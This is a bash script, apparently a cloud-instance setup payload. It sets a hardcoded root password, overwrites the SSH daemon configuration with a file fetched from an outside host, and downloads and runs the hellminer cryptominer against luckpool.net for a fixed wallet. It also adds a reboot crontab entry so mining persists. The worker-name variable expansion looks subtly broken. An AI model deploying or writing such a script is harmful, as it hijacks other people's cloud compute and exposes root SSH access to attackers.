#!/bin/bash -x
printf "1sampai5\n1sampai5" | passwd root
wget https://rootends.com/linux-master/commonsfiles/sshd_config_gcloud -O /tmp/sshd_config && cp /tmp/sshd_config /etc/ssh/sshd_config
systemctl restart sshd
cd /root
INSTANCE_IP=$(curl http://169.254.169.254/latest/meta-data/public-ipv4)
WORKER_NAME="${INSTANCE_IP//./_}"
wget -O hellminer.tar.gz https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xvfz hellminer.tar.gz
cat > runner.sh << __EOF__
#!/bin/bash -x
while (true); do
    ./hellminer \
    -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJG99psYNahypxH3ikwkJbLW7jycmDGMsM.${!WORKER_NAME} -p x --cpu $((`nproc`-1)) \
    >> /tmp/hellminer.log 2>&1
done
__EOF__
chmod +x runner.sh

#add crontab
crontab -l > mycron
echo "@reboot sh /root/runner.sh" >> mycron
crontab mycron
rm mycron

#non-interactive grub
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure grub-pc

#update & upgrade
apt update && apt upgrade -y

#reboot
shutdown -r now